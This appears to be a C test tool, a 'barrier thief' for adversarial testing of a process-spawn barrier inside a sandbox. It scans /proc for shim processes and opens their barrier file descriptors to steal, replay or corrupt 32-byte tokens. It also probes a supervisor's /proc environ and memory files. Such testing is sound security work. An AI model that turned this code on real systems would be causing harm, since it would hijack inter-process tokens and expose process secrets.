// gate6 m2 barrier thief. ONLY run inside a private user+pid namespace (host-like: capability-less, same uid).
// usage: thief MODE LOG    MODE: steal (open the shim's barrier fd for reading, read whatever arrives, log it as hex,
//   then write it back), garbage (write 32 bytes of 'G'), replay (write the last stolen token into every new shim),
//   probe (only try to open, log success / errno). Also probes /proc/<supervisor>/{environ,mem,fd} once (argv[3] = pid).
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <poll.h>
#include <time.h>
static double now(){ struct timespec t; clock_gettime(CLOCK_REALTIME,&t); return t.tv_sec+t.tv_nsec/1e9; }
int main(int argc,char**argv){
  if(argc<3) return 2; const char*mode=argv[1]; FILE*lf=fopen(argv[2],"a"); setvbuf(lf,0,_IOLBF,0);
  static char done[1<<22]; unsigned char last[32]; int have=0;
  if(argc>3){ const char*fs[]={"environ","mem","fd/0","cwd"}; for(int i=0;i<4;i++){ char p[64]; snprintf(p,64,"/proc/%s/%s",argv[3],fs[i]);
      int fd=open(p,O_RDONLY); fprintf(lf,"supervisor %s: %s\n",p, fd>=0?"OPENED":strerror(errno)); if(fd>=0) close(fd);} }
  for(;;){
    DIR*d=opendir("/proc"); struct dirent*e;
    while(d&&(e=readdir(d))){
      int pid=atoi(e->d_name); if(pid<=1||pid>=(1<<22)||done[pid]) continue;
      char p[64],buf[4096]; snprintf(p,64,"/proc/%d/cmdline",pid);
      int fd=open(p,O_RDONLY); if(fd<0) continue; ssize_t n=read(fd,buf,sizeof buf-1); close(fd); if(n<=0) continue; buf[n]=0;
      char*a1=buf+strlen(buf)+1; if(a1>=buf+n||strcmp(a1,"__spawn-barrier")) continue;
      char*a2=a1+strlen(a1)+1; if(a2>=buf+n) continue; int bfd=atoi(a2);
      done[pid]=1; snprintf(p,64,"/proc/%d/fd/%d",pid,bfd);
      int flags = !strcmp(mode,"steal") ? (O_RDWR|O_NONBLOCK) : (O_WRONLY|O_NONBLOCK);
      double t0=now(); int w=open(p,flags);
      if(w<0){ fprintf(lf,"%.6f pid %d fd %d open %s: %s\n",t0,pid,bfd,mode,strerror(errno)); continue; }
      fprintf(lf,"%.6f pid %d fd %d OPENED (%s)\n",t0,pid,bfd,mode);
      if(!strcmp(mode,"garbage")){ ssize_t k=write(w,"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG",32); fprintf(lf,"  wrote %zd garbage bytes\n",k); close(w); }
      else if(!strcmp(mode,"replay")){ if(have){ ssize_t k=write(w,last,32); fprintf(lf,"  replayed an old token: %zd\n",k);} close(w); }
      else if(!strcmp(mode,"steal")){
        // race the shim for the token for up to 20 s
        unsigned char tok[32]; size_t got=0; double t1=now();
        while(got<32 && now()-t1<20){ ssize_t k=read(w,tok+got,32-got); if(k>0) got+=k; else usleep(200); }
        fprintf(lf,"  stole %zu bytes:",got); for(size_t i=0;i<got;i++) fprintf(lf,"%02x",tok[i]); fprintf(lf,"\n");
        if(got==32){ memcpy(last,tok,32); have=1; ssize_t k=write(w,tok,32); fprintf(lf,"  wrote it back: %zd\n",k); }
        close(w);
      } else close(w);
    }
    if(d) closedir(d); usleep(200);
  }
}
